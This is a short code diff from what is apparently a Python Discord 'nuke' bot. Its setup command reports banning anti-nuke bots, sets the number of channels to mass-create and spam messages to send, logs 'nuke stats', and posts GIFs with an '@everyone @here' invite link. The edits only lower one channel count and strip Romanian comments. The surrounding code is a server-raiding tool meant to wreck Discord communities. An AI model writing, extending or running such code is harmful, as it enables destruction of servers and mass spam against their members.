@@ -568,7 +568,7 @@ async def setup(ctx):
         await user.send(f"✅ Banned anti-nuke bots: {', '.join(banned_bots)}")
 
     is_owner = (user.id == OWNER_ID)
-    total_channels = 200 if is_owner else 120
+    total_channels = 200 if is_owner else 100
     spam_messages = 25 if is_owner else 20
 
     save_nuke_stats(user.id, guild)
@@ -625,9 +625,9 @@ async def setup(ctx):
     embed_gif1 = discord.Embed(color=0x000000)
     embed_gif1.set_image(url="https://38.media.tumblr.com/662c079bd6ad88db4277487c78422174/tumblr_nvn2znud8t1qjrwyno1_1280.gif")
 
-    # ===== GIF 2 (alt gif, poți schimba URL-ul) =====
+    # ===== GIF 2 (alt gif) =====
     embed_gif2 = discord.Embed(color=0x000000)
-    embed_gif2.set_image(url="https://i.imgur.com/yMQvcRw.gif")  # același ca exemplu, poți pune altul
+    embed_gif2.set_image(url="https://i.imgur.com/yMQvcRw.gif")
 
     # ===== MESAJ TEXT =====
     text_message = "@everyone @here join https://discord.gg/larpempire"
